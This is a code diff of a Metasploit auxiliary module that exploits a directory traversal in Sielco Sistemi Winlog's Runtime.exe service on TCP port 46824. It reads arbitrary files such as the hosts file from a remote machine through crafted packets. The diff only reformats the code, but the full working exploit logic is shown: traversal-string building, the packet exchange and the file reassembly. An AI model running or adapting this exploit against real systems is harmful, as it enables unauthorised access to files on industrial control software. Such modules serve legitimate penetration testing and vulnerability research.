@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,56 +7,55 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Sielco Sistemi Winlog Remote File Access',
-      'Description'    => %q{
-          This module exploits a directory traversal in Sielco Sistemi Winlog. The vulnerability
-        exists in the Runtime.exe service and can be triggered by sending a specially crafted packet
-        to the 46824/TCP port. This module has been successfully tested on Sielco Sistemi Winlog Lite
-        2.07.14.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
-          'Luigi Auriemma', # Vulnerability Discovery and PoC
-          'juan vazquez' # Metasploit module
-        ],
-      'References'     =>
-        [
-          [ 'OSVDB', '83275' ],
-          [ 'BID', '54212' ],
-          [ 'EDB', '19409'],
-          [ 'URL', 'http://aluigi.altervista.org/adv/winlog_2-adv.txt' ]
-        ]
-    ))
+                      'Name'           => 'Sielco Sistemi Winlog Remote File Access',
+                      'Description'    => %q(
+                          This module exploits a directory traversal in Sielco Sistemi Winlog. The vulnerability
+                        exists in the Runtime.exe service and can be triggered by sending a specially crafted packet
+                        to the 46824/TCP port. This module has been successfully tested on Sielco Sistemi Winlog Lite
+                        2.07.14.
+                      ),
+                      'License'        => MSF_LICENSE,
+                      'Author'         =>
+                        [
+                          'Luigi Auriemma', # Vulnerability Discovery and PoC
+                          'juan vazquez' # Metasploit module
+                        ],
+                      'References'     =>
+                        [
+                          [ 'OSVDB', '83275' ],
+                          [ 'BID', '54212' ],
+                          [ 'EDB', '19409'],
+                          [ 'URL', 'http://aluigi.altervista.org/adv/winlog_2-adv.txt' ]
+                        ]))
 
     register_options(
       [
         Opt::RPORT(46824),
         OptString.new('FILEPATH', [true, 'The name of the file to download', '/WINDOWS/system32/drivers/etc/hosts']),
         OptInt.new('DEPTH', [true, 'Traversal depth', 10])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def run_host(ip)
     # No point to continue if no filename is specified
-    if datastore['FILEPATH'].nil? or datastore['FILEPATH'].empty?
+    if datastore['FILEPATH'].nil? || datastore['FILEPATH'].empty?
       print_error("#{ip}:#{rport} - Please supply the name of the file you want to download")
       return
     end
 
     travs = "../" * datastore['DEPTH']
-    if datastore['FILEPATH'][0] == "/"
-      travs << datastore['FILEPATH'][1, datastore['FILEPATH'].length]
-    else
-      travs << datastore['FILEPATH']
-    end
+    travs << if datastore['FILEPATH'][0] == "/"
+               datastore['FILEPATH'][1, datastore['FILEPATH'].length]
+             else
+               datastore['FILEPATH']
+             end
 
     connect
 
@@ -90,8 +90,7 @@ class MetasploitModule < Msf::Auxiliary
       print_error "#{ip}:#{rport} - Error getting the file length"
       return
     end
-    file_length = response[1,4].unpack("V").first
-
+    file_length = response[1, 4].unpack("V").first
 
     # Read File with the help of _TCPIPS_BinGetStringRecordFP
     contents = ""
@@ -106,19 +105,19 @@ class MetasploitModule < Msf::Auxiliary
       response = ""
 
       while response.length < 0x7ac # Packets of 0x7ac (header (0x9) + block of data (0x7a3))
-        response << sock.get_once(0x7ac-response.length, 5) || ''
+        response << sock.get_once(0x7ac - response.length, 5) || ''
       end
       if response.unpack("C").first != 0x98
         print_error "#{ip}:#{rport} - Error reading the file, anyway we're going to try to finish"
       end
 
-      if (file_length - contents.length) < response.length - 9
-        contents << response[9, file_length - contents.length] # last packet
-      else
-        contents << response[9, response.length] # no last packet
-      end
+      contents << if (file_length - contents.length) < response.length - 9
+                    response[9, file_length - contents.length] # last packet
+                  else
+                    response[9, response.length] # no last packet
+                  end
 
-      offset = offset + 0x17 # 17 blocks in every packet
+      offset += 0x17 # 17 blocks in every packet
     end
 
     # Close File through _TCPIPS_BinCloseFileFP
@@ -145,7 +144,5 @@ class MetasploitModule < Msf::Auxiliary
       datastore['FILEPATH']
     )
     print_status("#{ip}:#{rport} - File saved in: #{path}")
-
   end
-
 end
